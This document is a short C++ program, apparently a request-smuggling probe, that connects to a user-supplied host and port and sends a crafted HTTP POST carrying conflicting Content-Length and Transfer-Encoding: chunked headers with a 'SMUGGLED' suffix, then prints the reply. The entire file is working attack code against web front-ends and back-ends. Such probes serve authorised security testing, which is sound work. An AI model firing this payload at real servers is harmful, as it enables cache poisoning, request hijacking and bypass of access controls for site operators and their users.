// ============================================================
// smuggle_probe.cpp — CL.TE / TE.CL smuggling probe
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o smuggle_probe smuggle_probe.cpp
// Usage:   ./smuggle_probe <host> <port>
// ============================================================
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>
#include <string>

int main(int argc, char** argv) {
    if (argc < 3) return 1;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(std::atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &dst.sin_addr);
    if (connect(s, (sockaddr*)&dst, sizeof(dst)) < 0) return 1;

    // CL.TE probe
    std::string req =
        "POST / HTTP/1.1\r\n"
        "Host: target\r\n"
        "Content-Length: 13\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "SMUGGLED";

    send(s, req.c_str(), req.size(), 0);
    char buf[4096];
    int n = recv(s, buf, sizeof(buf) - 1, 0);
    if (n > 0) { buf[n] = 0; std::printf("%s\n", buf); }
    return 0;
}
